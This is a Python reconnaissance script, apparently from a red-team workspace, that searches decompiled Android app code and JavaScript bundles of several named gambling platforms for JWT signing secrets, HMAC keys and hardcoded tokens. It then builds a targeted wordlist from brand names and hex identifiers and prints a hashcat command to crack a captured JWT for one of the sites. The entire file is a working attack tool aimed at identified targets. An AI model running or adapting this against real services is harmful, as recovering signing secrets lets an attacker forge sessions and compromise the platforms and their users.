import subprocess, pathlib, re, sys

def grep(path, pattern, label):
    r = subprocess.run(
        ["grep", "-rn", "--include=*.java", "--include=*.js",
         "--include=*.json", "--include=*.kt", "--include=*.xml",
         "-i", "-E", pattern, str(path)],
        capture_output=True, text=True, timeout=30
    )
    hits = r.stdout.strip().splitlines()
    if hits:
        print(f"\n=== {label} ===")
        for h in hits[:15]:
            print(h[:200])
    return hits

JADX = pathlib.Path("/home/kzp/claude-red/nuxt/data/apk/jadx_out_all")
BO_JS = pathlib.Path("/home/kzp/claude-red/nuxt/data")

# 1. JWT secret patterns in APK
if JADX.exists():
    grep(JADX, r'jwt[_\-]?secret|signing[_\-]?key|secret[_\-]?key|JWT_SECRET|HS256|hmac', "APK: JWT/HMAC patterns")
    grep(JADX, r'(secret|key|token)\s*=\s*["\'][a-zA-Z0-9+/=_\-]{16,}["\']', "APK: hardcoded secret=")
    grep(JADX, r'["\'][a-f0-9]{32,64}["\']', "APK: 32-64 char hex strings")
else:
    print(f"[!] jadx dir not found: {JADX}")

# 2. JWT secret in BO JS bundles
for d in [pathlib.Path("/home/kzp/claude-red/nuxt/bo_js"),
          pathlib.Path("/home/kzp/claude-red/nuxt/data/bo_js"),
          pathlib.Path("/home/kzp/claude-red/nuxt/data/js")]:
    if d.exists():
        grep(d, r'jwt[_\-]?secret|signing[_\-]?key|secret[_\-]?key', f"{d.name}: JWT patterns")
        grep(d, r'"secret"\s*:\s*"[^"]{16,}"', f"{d.name}: secret value")
        break

# 3. Search all collected JS files
for d in [pathlib.Path("/home/kzp/claude-red/nuxt/data"),
          pathlib.Path("/home/kzp/claude-red/nuxt")]:
    r = subprocess.run(
        ["find", str(d), "-name", "*.js", "-size", "+1k"],
        capture_output=True, text=True, timeout=10
    )
    files = r.stdout.strip().splitlines()
    if files:
        print(f"\n=== JS files in {d.name} ({len(files)} found) ===")
        for f in files[:5]:
            print(f)

# 4. env/config files with secrets
for d in [pathlib.Path("/home/kzp/claude-red"),
          pathlib.Path("/home/kzp/claude-red/nuxt/data")]:
    grep(d, r'jwt[_\-]?secret|JWT_SECRET|signing_key|SIGNING_KEY', f"{d.name}: env/config JWT")

# 5. Targeted wordlist + hashcat
print("\n=== 5. Generating targeted wordlist ===")
terms = [
    "luxino", "vak88", "slxoz1688", "wee88z", "asdgapi",
    "jwt_secret", "secret", "jwtSecret", "JwtSecret", "JWT_SECRET",
    "vak88secret", "luxinosecret", "platform2026", "lux2026",
    "vak882026", "slxoz2026", "gambling", "casino",
    "asdgapicenterssdo", "sms_lux", "papdieaw",
    "8dde385a78fa808f2c3bbeb1c1963000",  # cf value itself?
    "09b2c3ab78fa9e070e9b0517ed1508d5",  # slxoz TID
    "54ef7626cb381f4bab8be91f0cdbce47",  # we88c TID
]
wl = pathlib.Path("/home/kzp/claude-red/targeted.txt")
wl.write_text("\n".join(terms) + "\n")
print(f"Written {len(terms)} terms to {wl}")
print("Run: hashcat -a 0 -m 16500 /home/kzp/claude-red/slxoz1688.jwt.txt /home/kzp/claude-red/targeted.txt")
